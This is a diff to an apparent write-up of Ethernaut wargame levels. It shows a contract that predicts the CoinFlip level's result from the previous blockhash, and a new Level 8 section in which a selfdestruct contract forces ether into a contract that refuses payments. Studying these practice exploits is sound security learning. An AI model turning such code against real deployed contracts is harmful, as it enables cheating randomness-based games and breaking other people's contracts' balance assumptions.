@@ -74,15 +74,15 @@ I wrote up the following contract:
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity >=0.7.0 <0.9.0;
 
-contract CoinFlipper {
+contract Level4 {
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    address private flipContract = [ethernaut's contract address here];
+    address private flipAddress = [ethernaut's contract address here];
 
     function makeGuess() external {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
-        CoinFlip(flipContract).flip(side);
+        CoinFlip(flipAddress).flip(side);
     }
 
 }
@@ -192,3 +192,23 @@ sendTransaction({to:contract.address, from:player, data:"dd365b8b"});
 It seems that web3js etc took care of all the other details, such as gas price, gas allocation, etc. I'm glad I didn't need to dive into all of those details myself.
 
 # Level 8: Force
+This is another strange one. We are faced with a contract that has no payable methods and no fallbacks defined. It turns out some contracts really don't want to receive any payments, but there is a tricky way to force a payment on somebody: a contract can self-destruct, and when this happens it sends its entire balance to an address. That address is forced to receive the balance.
+
+It's a bit weird that `selfdestruct()` exists - it looks like there's some interesting history behind it. Nevertheless, it does exist and it's a way to force payment to an address that doesn't have payment fallbacks. I built the following contract that can receive payment and immediately self-destruct, sending its balance to a supplied address.
+```
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity >=0.7.0 <0.9.0;
+
+contract Level7 {
+    function boom(address payable beneficiary) payable external {
+      selfdestruct(payable(address(beneficiary)));
+    }
+}
+```
+
+After deploying this, I created a web3js contract similarly to in previous levels, and then called the `boom()` method with the level contract's address, along with some ether for it to then disperse on self-destruction, using the following invocation:
+```
+con.methods.boom(contract.address).send({value:web3.utils.toWei("0.0001", "ether")})
+```
+This completed the level.
+
